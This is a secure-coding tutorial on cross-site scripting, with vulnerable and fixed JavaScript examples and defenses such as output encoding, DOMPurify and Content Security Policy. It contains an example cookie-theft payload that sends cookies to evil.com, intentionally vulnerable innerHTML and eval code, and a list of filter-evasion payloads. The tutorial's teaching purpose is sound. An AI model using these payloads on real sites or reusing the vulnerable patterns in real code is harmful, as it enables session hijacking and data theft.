# XSS: Cross-Site Scripting

## Definition

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The attacker's code executes in the victim's browser with the same privileges as the legitimate page, potentially stealing sensitive data, hijacking sessions, performing unauthorized actions, or distributing malware.

XSS exploits the principle that browsers trust content served from the same origin. If an application fails to properly validate, sanitize, or encode user input before displaying it, an attacker can inject JavaScript that the browser will execute.

---

## The Three Types of XSS

### 1. Stored (Persistent) XSS

**How it works:**
1. Attacker submits malicious JavaScript as input (e.g., in a comment, forum post, profile bio, or product review)
2. The application saves this malicious input to a database without proper sanitization
3. Whenever any user views the page containing this input, the malicious script executes in their browser
4. The script runs with the privileges of that user, potentially stealing cookies, session tokens, or performing actions on their behalf

**Real-world scenario:**
A social media platform allows users to update their bio. An attacker enters: `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`. Every user who visits the attacker's profile has their cookies sent to the attacker's server.

**Vulnerable code example:**

```javascript
// Express backend - insecure
app.post('/api/comments', (req, res) => {
  const comment = req.body.text; // User input directly from request

  // Saved to database without sanitization
  db.comments.insert({
    author: req.user.id,
    text: comment, // DANGEROUS: not sanitized
    timestamp: new Date()
  });

  res.json({ success: true });
});

// Frontend - insecure rendering
function renderComment(comment) {
  const commentDiv = document.getElementById('comments');
  // innerHTML directly inserts user-provided HTML
  commentDiv.innerHTML += `<div class="comment">${comment.text}</div>`;
  // If comment.text is "<img src=x onerror='alert(1)'>", the script runs
}
```

**Secure code example:**

```javascript
// Express backend - secure
const DOMPurify = require('isomorphic-dompurify');

app.post('/api/comments', (req, res) => {
  const comment = req.body.text;

  // Sanitize the comment to remove dangerous HTML/JS
  const sanitized = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'p', 'br'],
    ALLOWED_ATTR: []
  });

  db.comments.insert({
    author: req.user.id,
    text: sanitized, // Safe: malicious scripts removed
    timestamp: new Date()
  });

  res.json({ success: true });
});

// Frontend - secure rendering
function renderComment(comment) {
  const commentDiv = document.getElementById('comments');
  const div = document.createElement('div');
  div.className = 'comment';

  // textContent automatically escapes all HTML/JS
  div.textContent = comment.text;
  commentDiv.appendChild(div);
}

// Or with React (auto-escapes by default)
function CommentComponent({ text }) {
  return <div className="comment">{text}</div>;
  // React automatically escapes, preventing XSS
}
```

---

### 2. Reflected XSS

**How it works:**
1. Attacker crafts a malicious URL containing JavaScript in a query parameter or path
2. Attacker tricks a user into clicking the link (via phishing email, chat message, forum post)
3. The user's browser requests the URL from the legitimate application
4. The application immediately reflects (includes) the parameter in the response without encoding it
5. The browser renders the response, executing the malicious script in the attacker's crafted URL

**Real-world scenario:**
A search page displays the search query back to the user: "You searched for: [query]". An attacker sends the link: `https://example.com/search?q=<script>stealPassword()</script>`. A victim clicks it, and the script executes.

**Vulnerable code example:**

```javascript
// Express backend - insecure
app.get('/search', (req, res) => {
  const query = req.query.q;

  // Query is directly reflected in HTML without encoding
  res.send(`
    <html>
      <body>
        <h1>You searched for: ${query}</h1>
        <p>Results: ...</p>
      </body>
    </html>
  `);
  // If query = "<img src=x onerror='alert(1)'>", script executes
});

// Frontend - insecure
function displaySearchResults(query) {
  document.getElementById('results').innerHTML = `
    <p>You searched for: ${query}</p>
  `;
  // Direct query string interpolation is dangerous
}
```

**Secure code example:**

```javascript
// Express backend - secure
const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
  const query = req.query.q || '';

  // Encode the query to escape all HTML special characters
  const safeQuery = escapeHtml(query);

  res.send(`
    <html>
      <body>
        <h1>You searched for: ${safeQuery}</h1>
        <p>Results: ...</p>
      </body>
    </html>
  `);
  // If query = "<img src=x>", it renders as literal text
});

// Frontend - secure
function displaySearchResults(query) {
  const resultsDiv = document.getElementById('results');
  const p = document.createElement('p');
  p.textContent = `You searched for: ${query}`;
  resultsDiv.appendChild(p);
  // textContent safely escapes all HTML
}

// Or use template literals with encoding
function displaySearchResults(query) {
  const encoded = document.createElement('div').appendChild(
    document.createTextNode(query)
  ).parentNode.innerHTML;

  document.getElementById('results').innerHTML = `
    <p>You searched for: ${encoded}</p>
  `;
}
```

---

### 3. DOM-based XSS

**How it works:**
1. The application reads data from a DOM source (e.g., `location.hash`, `window.name`, `localStorage`) that is partially controlled by the attacker
2. The data is processed by client-side JavaScript
3. The data is written to a DOM sink (e.g., `innerHTML`, `eval()`, `document.write()`) without proper encoding
4. The malicious script executes in the victim's browser
5. Notably, the server never sees the malicious payload, making it harder to detect via logs

**Real-world scenario:**
A web application processes URL anchors to show/hide sections: `https://example.com#showSection=<img src=x onerror='stealData()'>`. The JavaScript reads `location.hash`, extracts the parameter, and uses it in `innerHTML` without encoding.

**Vulnerable code example:**

```javascript
// Frontend - insecure
// URL: https://example.com#showSection=<img src=x onerror='alert(1)'>
function initializeUI() {
  const hash = window.location.hash.substring(1); // Gets "showSection=..."
  const params = new URLSearchParams(hash);
  const section = params.get('showSection');

  // Directly inserting user-controlled data into DOM
  document.getElementById('content').innerHTML = `
    <h2>${section}</h2>
    <p>Loading content...</p>
  `;
  // If section = "<img src=x onerror='alert(1)'>", script executes
}

// Another dangerous pattern
function updateProfileBio() {
  const bio = localStorage.getItem('userBio'); // Could be attacker-controlled

  document.getElementById('profile').innerHTML = `
    <div>${bio}</div>
  `;
  // If localStorage is compromised, XSS is possible
}

// Dangerous use of eval with user data
function processCommand(userInput) {
  const command = window.location.search.substring(1);

  eval('executeCommand(' + command + ')'); // EXTREMELY DANGEROUS
  // Attacker could inject: ; alert('XSS'); //
}
```

**Secure code example:**

```javascript
// Frontend - secure
// URL: https://example.com#showSection=<img src=x onerror='alert(1)'>
function initializeUI() {
  const hash = window.location.hash.substring(1);
  const params = new URLSearchParams(hash);
  const section = params.get('showSection');

  // Create elements programmatically, avoiding innerHTML
  const contentDiv = document.getElementById('content');
  contentDiv.innerHTML = ''; // Clear previous content

  const heading = document.createElement('h2');
  heading.textContent = section; // textContent auto-escapes

  const para = document.createElement('p');
  para.textContent = 'Loading content...';

  contentDiv.appendChild(heading);
  contentDiv.appendChild(para);
  // Now even if section contains HTML, it's rendered as text
}

// Secure localStorage usage
function updateProfileBio() {
  const bio = localStorage.getItem('userBio');

  // Always assume data from storage could be compromised
  const profileDiv = document.getElementById('profile');
  profileDiv.textContent = bio; // textContent is safe
}

// Secure command processing
function processCommand(userInput) {
  const command = window.location.search.substring(1);

  // Never use eval. Instead, use a whitelist of allowed commands
  const allowedCommands = {
    'fetchData': () => fetch('/api/data'),
    'logout': () => window.location.href = '/logout',
    'showHelp': () => displayHelp()
  };

  if (allowedCommands[command]) {
    allowedCommands[command]();
  } else {
    console.error('Unknown command');
  }
}

// Alternative: Use JSON.parse instead of eval for data
function processConfig(jsonString) {
  try {
    const config = JSON.parse(jsonString); // Safe for JSON only
    applyConfig(config);
  } catch (e) {
    console.error('Invalid JSON');
  }
}
```

---

## Security Defenses Against XSS

### 1. Output Encoding (Context-aware)

Encode data based on where it's being used:

```javascript
// HTML context: encode <, >, &, ", '
function encodeHTML(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  };
  return str.replace(/[&<>"']/g, char => map[char]);
}

// Use in HTML
const safe = encodeHTML(userInput);
element.innerHTML = `<p>${safe}</p>`;

// JavaScript context: use JSON.stringify
const data = { key: userInput };
const safe = JSON.stringify(data);
element.textContent = `var config = ${safe}`;

// URL context: use encodeURIComponent
const safe = encodeURIComponent(userInput);
element.href = `https://example.com?param=${safe}`;

// CSS context: use backslash escaping
const safe = userInput.replace(/[^a-zA-Z0-9]/g, ch => '\\' + ch);
element.style.background = `url("${safe}")`;
```

### 2. DOMPurify for HTML Sanitization

```javascript
// Install: npm install dompurify

import DOMPurify from 'dompurify';

// For rich text that needs HTML support
const dirtyHTML = `<p>Hello</p><img src=x onerror='alert(1)'>`;
const cleanHTML = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a'],
  ALLOWED_ATTR: ['href', 'title']
});

// Result: "<p>Hello</p><img src=\"x\">" (onerror removed)
element.innerHTML = cleanHTML;
```

### 3. Use textContent Instead of innerHTML for Plain Text

```javascript
// INSECURE
element.innerHTML = userInput; // Treats input as HTML

// SECURE
element.textContent = userInput; // Treats input as plain text
```

### 4. React JSX Auto-Escaping

```javascript
// React automatically escapes values in JSX
function Comment({ text }) {
  // Even if text = "<img src=x onerror='alert(1)'>", it's safe
  return <div>{text}</div>;
}

// JSX escapes by default; use dangerouslySetInnerHTML only if you trust the source
function TrustedHTML({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

### 5. Content Security Policy (CSP)

```javascript
// HTTP header: Content-Security-Policy

// Strict CSP: blocks all inline scripts
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';

// Allows scripts only from same origin
// Prevents <script>alert(1)</script> from executing
// Even if injected, inline scripts won't run

// With nonce (cryptographic token)
Content-Security-Policy: script-src 'nonce-abc123';

// In HTML
<script nonce="abc123">
  // This runs because nonce matches
  console.log('Safe script');
</script>

// Injected script without nonce won't run
<script>
  alert('Injected - blocked by CSP');
</script>
```

### 6. Framework Protection Features

```javascript
// Angular: automatic context-aware escaping
export class SafeComponent {
  constructor(private sanitizer: DomSanitizer) {}

  safeHtml = this.sanitizer.sanitize(SecurityContext.HTML, userInput);
}

// Vue: v-text instead of v-html
<div v-text="userInput"></div> <!-- Safe -->
<div v-html="userInput"></div>  <!-- Dangerous, use only if trusted -->

// Ember: automatic HTML escaping
{{userInput}} <!-- Automatically escaped -->
{{{userInput}}} <!-- Raw HTML, dangerous -->
```

---

## Best Practices Checklist

- **Input Validation**: Validate that inputs match expected format/type
  - Reject unexpected patterns early
  - Use allowlists instead of blocklists when possible

- **Output Encoding**: Always encode data before rendering
  - Use context-aware encoding (HTML, JavaScript, URL, CSS)
  - Apply encoding at the point of output, not input

- **Use Safe APIs**: Prefer safe APIs over dangerous ones
  - `textContent` over `innerHTML`
  - `createElement()` over string concatenation
  - `JSON.parse()` over `eval()`

- **Use Framework Protections**: Leverage built-in security features
  - React's auto-escaping in JSX
  - Angular's `DomSanitizer`
  - Vue's `v-text` directive

- **Implement CSP**: Deploy Content Security Policy headers
  - Start with strict policies
  - Use `report-uri` to monitor violations
  - Gradually relax only when necessary

- **Sanitization Libraries**: Use established libraries
  - DOMPurify for HTML sanitization
  - Sanitize-html for Node.js
  - Bleach for Python (not JS, but similar concept)

- **Secure Third-party Scripts**: Control third-party code
  - Use subresource integrity (SRI) checksums
  - Load scripts from trusted sources only
  - Apply CSP to restrict what they can do

- **Test for XSS**: Include security testing in your workflow
  - Use OWASP XSS Filter Evasion Cheat Sheet to find edge cases
  - Automated testing with tools like Burp Suite, OWASP ZAP
  - Manual penetration testing by security experts

- **Security Headers**: Deploy multiple layers
  - `Content-Security-Policy`
  - `X-Content-Type-Options: nosniff`
  - `X-Frame-Options: DENY`
  - `X-XSS-Protection: 1; mode=block` (legacy, CSP is better)

- **Regular Updates**: Keep dependencies current
  - Vulnerabilities in sanitization libraries are fixed regularly
  - Update Node.js, npm packages, browser libraries

- **Code Review**: Review code that handles user input
  - Focus on data flow from input to output
  - Watch for multiple encoding/sanitization steps (can cause issues)
  - Verify assumptions about data origin

---

## Common XSS Bypass Techniques (Know Your Adversary)

Attackers use these techniques to bypass basic XSS filters:

```javascript
// Case variation
<ScRiPt>alert(1)</sCrIpT>

// HTML entities
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

// URL encoding in attributes
<img src=x onerror="alert%281%29">

// Null byte injection (bypasses naive string matching)
<img src=x onerror="alert\0(1)">

// Using less-common event handlers
<svg onload="alert(1)">
<marquee onstart="alert(1)">
<details open ontoggle="alert(1)">

// SVG/XML contexts
<svg><script>alert(1)</script></svg>

// Attribute breaking
" onmouseover="alert(1)
' onmouseover='alert(1)

// Data URIs
<img src="data:text/html,<script>alert(1)</script>">

// Unicode/UTF encoding
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

**Lesson**: Don't rely on simple string matching or blacklists. Use established, well-tested libraries and comprehensive CSP.

---

## Real-World Impacts of XSS

- **Session Hijacking**: Stealing session cookies to impersonate users
- **Credential Theft**: Injecting fake login forms to capture passwords
- **Malware Distribution**: Redirecting to malicious sites or injecting drive-by download exploits
- **Account Takeover**: Changing passwords, email addresses, or sensitive settings
- **Website Defacement**: Modifying page content for all users
- **Phishing**: Injecting fake content to trick users into revealing information
- **Privacy Violation**: Accessing sensitive data or personal information
- **Unauthorized Transactions**: Performing actions (transfers, purchases) on behalf of users

---

## Related Reading

- OWASP Top 10: A7 - Cross-Site Scripting (XSS)
- OWASP XSS Prevention Cheat Sheet
- CWE-79: Improper Neutralization of Input During Web Page Generation
- Content Security Policy (CSP) Reference
- DOMPurify Documentation
